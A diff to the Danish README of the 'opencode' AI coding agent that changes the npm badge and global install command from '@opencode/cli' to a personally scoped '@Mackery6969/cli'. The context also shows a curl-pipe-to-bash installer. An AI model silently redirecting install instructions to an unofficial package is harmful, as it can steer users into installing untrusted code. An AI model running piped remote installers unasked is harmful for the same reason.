@@ -10,7 +10,7 @@
 <p align="center">Den open source AI-kodeagent.</p>
 <p align="center">
   <a href="https://opencode.ai/discord"><img alt="Discord" src="https://img.shields.io/discord/1391832426048651334?style=flat-square&label=discord" /></a>
-  <a href="https://www.npmjs.com/package/@opencode/cli"><img alt="npm" src="https://img.shields.io/npm/v/@opencode/cli?style=flat-square" /></a>
+  <a href="https://www.npmjs.com/package/@Mackery6969/cli"><img alt="npm" src="https://img.shields.io/npm/v/@Mackery6969/cli?style=flat-square" /></a>
   <a href="https://github.com/anomalyco/opencode/actions/workflows/release.yml"><img alt="Build status" src="https://img.shields.io/github/actions/workflow/status/anomalyco/opencode/release.yml?style=flat-square&branch=dev" /></a>
 </p>
 
@@ -50,7 +50,7 @@
 curl -fsSL https://opencode.ai/v2/install | bash
 
 # Pakkehåndteringer
-npm i -g @opencode/cli@latest      # eller bun/pnpm/yarn
+npm i -g @Mackery6969/cli@latest      # eller bun/pnpm/yarn
 brew install anomalyco/tap/opencode-v2 # macOS og Linux (anbefalet, altid up to date)
 brew install opencode              # macOS og Linux (officiel brew formula, opdateres sjældnere)
 sudo pacman -S opencode            # Arch Linux (Stable)
